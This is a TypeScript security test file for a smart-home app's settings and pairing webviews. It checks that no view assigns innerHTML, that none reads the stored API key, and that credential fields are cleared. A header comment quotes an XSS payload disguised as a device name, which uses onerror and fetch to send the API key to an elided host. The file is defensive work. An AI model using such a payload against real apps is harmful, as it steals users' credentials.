import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, readdirSync, existsSync } from 'node:fs';
import { join } from 'node:path';

/**
 * The two privileged webviews, and what may reach a HTML parser inside them.
 *
 * Both surfaces are privileged in the same way, and it is worth being blunt about
 * it: **the API key lives in `homey.settings`**, so a settings webview can read
 * it with `Homey.get('flowWriteApiKey')`. That is the SDK's own design and not
 * something this app can prevent. "The key is never returned over the app API" is
 * true and is not the whole perimeter — the perimeter is these files, and it
 * holds only while nothing here executes markup it did not author.
 *
 * The values these views render are device names, zone names, capability labels
 * and error text from other people's integrations. None of it is authored by us.
 * A light named `"><img src=x onerror=fetch('…?k='+Homey.get('flowWriteApiKey'))>`
 * was one string concatenation away from working.
 *
 * So: no interpolated value passes through an HTML parser, with two allowlisted
 * exceptions named and argued below.
 */

const ROOT = join(import.meta.dirname, '..', '..');

/**
 * Empty, and that is the strongest form this can take.
 *
 * Two views used to be here: the schedule screen built a window's card as a
 * string with `entryHtml` and the curve screen built a point's with
 * `pointHtml`, so every interpolated value had to go through `escapeHtml`.
 * The pairing rewrite replaced both with nodes, which took the last
 * `innerHTML` in the app with them — and `escapeHtml` after it.
 *
 * Leaving the map in place rather than deleting the machinery: the next screen
 * that reaches for a string template is the one this has to catch, and an
 * allowlist that exists and is empty says "not this way" more clearly than an
 * absence does.
 */
const ALLOWED = new Map<string, string>();

/** Every privileged webview on disk: the settings page and every pairing view. */
function privilegedViews(): string[] {
  const found = ['settings/index.html'];
  for (const driver of readdirSync(join(ROOT, 'drivers'))) {
    for (const mode of ['pair', 'repair']) {
      const dir = join(ROOT, 'drivers', driver, mode);
      if (!existsSync(dir)) continue;
      for (const file of readdirSync(dir)) {
        if (file.endsWith('.html')) found.push(`drivers/${driver}/${mode}/${file}`);
      }
    }
  }
  return found;
}

const read = (view: string) => readFileSync(join(ROOT, view), 'utf8');

/** Assignments only. A mention inside a comment is not an assignment. */
function innerHtmlAssignments(source: string): string[] {
  return source
    .split('\n')
    .filter(line => /\.innerHTML\s*=/.test(line))
    .filter(line => !/^\s*(\/\/|\*|\/\*)/.test(line.trimStart()) === true || !/^\s*[/*]/.test(line))
    .map(line => line.trim());
}

describe('no interpolated innerHTML in a privileged webview', () => {
  const views = privilegedViews();

  test('there are views to check, discovered from disk', () => {
    // Discovered rather than listed: a new driver's screens are covered the
    // moment they exist, which is the same reason pair-view-styles.test.ts
    // discovers its own.
    assert.ok(views.length >= 10, `found ${views.length} views`);
    assert.ok(views.includes('settings/index.html'));
  });

  test('the settings page assigns innerHTML nowhere at all', () => {
    // The strongest claim available, and it is true: every value it renders goes
    // through `textContent`. It has no `escapeHtml()` any more either, because
    // there is no concatenation left to make safe.
    assert.deepEqual(innerHtmlAssignments(read('settings/index.html')), []);
    assert.equal(read('settings/index.html').includes('function escapeHtml'), false);
  });

  test('no pairing view assigns innerHTML at all', () => {
    /**
     * The property the redesign made true. Every screen builds nodes, so there
     * is no concatenated markup anywhere in a privileged webview — which is a
     * cheaper guarantee to keep than "every interpolation is escaped", and it
     * cannot be got wrong one interpolation at a time.
     */
    for (const view of views) {
      const assignments = innerHtmlAssignments(read(view));
      const allowed = ALLOWED.get(view);

      if (!allowed) {
        assert.deepEqual(
          assignments, [],
          `${view} assigns innerHTML. Build the node instead — see node() in `
          + 'any of the views, and the reasoning at the top of this file',
        );
        continue;
      }

      assert.equal(
        assignments.length, 1,
        `${view} has ${assignments.length} innerHTML assignments; exactly one is `
        + `allowed, the ${allowed} render`,
      );
    }
  });

  test('and no view still carries the escaper that made one safe', () => {
    // `escapeHtml` was load-bearing in exactly the two views above. With the
    // markup gone it has nothing to guard, and a copy left behind would read as
    // a view that still builds strings somewhere.
    for (const view of views) {
      assert.equal(
        read(view).includes('function escapeHtml'), false,
        `${view} still defines escapeHtml — has a view gone back to building markup?`,
      );
    }
  });

});

describe('no view reads the API key', () => {
  const FORBIDDEN = [
    // The settings storage key, as lib/credential-service.ts spells it.
    'flowWriteApiKey',
  ];

  test('the key is never read back into a webview', () => {
    /**
     * A defensive convention, not a platform guarantee.
     *
     * `Homey.get('flowWriteApiKey')` would work — the settings webview has that
     * access by design. Nothing needs it: a key is WRITTEN through the app API
     * (which validates it with a real Flow write) and its status is read back as
     * `{ present, valid, failure }`, never as the token. So the token never
     * enters a document, and the XSS above has nothing to steal even if the rule
     * above it were ever broken.
     */
    for (const view of privilegedViews()) {
      const source = read(view);
      for (const token of FORBIDDEN) {
        assert.equal(
          source.includes(token), false,
          `${view} mentions "${token}". A webview never needs the token itself — `
          + 'see the reasoning at the top of this file',
        );
      }
    }
  });

  test('the app API never returns it either', () => {
    // The other half of the perimeter, asserted here so both halves are in one
    // place. diagnostics-redaction.test.ts covers the log and diagnostics paths.
    const api = readFileSync(join(ROOT, 'api.ts'), 'utf8');
    assert.equal(api.includes('flowWriteApiKey'), false);
    assert.equal(api.includes('getWriteClient'), false);
  });
});

/**
 * A pasted key must not outlive the round trip that checks it.
 *
 * Every pair view of a session is injected into ONE document (platform §8), and
 * that document also renders third-party device and zone names on the next
 * screen. The credential view read `#cr-key` and navigated on without clearing
 * it, so the plaintext key sat in an input there for the rest of the session —
 * while `settings/index.html` had always cleared its own field.
 *
 * Not a live vulnerability: every `innerHTML` site in the app escapes correctly,
 * which the tests above are about. It is the thing that perimeter exists to make
 * unnecessary, and the guard nearest it ("no view reads the API key") asserts
 * something adjacent — that no view MENTIONS the settings storage key — not this.
 */
describe('the credential screens do not keep what was pasted into them', () => {
  const CREDENTIAL_VIEWS = ['controller/pair', 'controller/repair', 'schedule/pair', 'schedule/repair'];

  test('every credential view clears its field', () => {
    for (const view of CREDENTIAL_VIEWS) {
      const source = readFileSync(
        join(import.meta.dirname, '..', '..', 'drivers', ...view.split('/'), 'credential.html'),
        'utf8',
      );
      assert.match(
        source, /field\.value = ''/,
        `drivers/${view}/credential.html never clears the pasted key`,
      );
    }
  });

  test('it clears on the failure path too, not only on success', () => {
    const source = readFileSync(
      join(import.meta.dirname, '..', '..', 'drivers', 'controller', 'pair', 'credential.html'),
      'utf8',
    );
    // A refused key is still a key, and a refusal is the path a user retries
    // from — so it is the one most likely to leave the field populated.
    const afterEmit = source.slice(source.indexOf("emit('setCredential'"));
    const inCatch = afterEmit.slice(afterEmit.indexOf('.catch('));
    assert.match(inCatch, /forget\(\)/, 'the catch branch does not clear the field');
  });

  test('the settings page still clears its own, which is where the idea came from', () => {
    const source = readFileSync(
      join(import.meta.dirname, '..', '..', 'settings', 'index.html'), 'utf8',
    );
    assert.match(source, /getElementById\('key'\)\.value = ''/);
  });
});
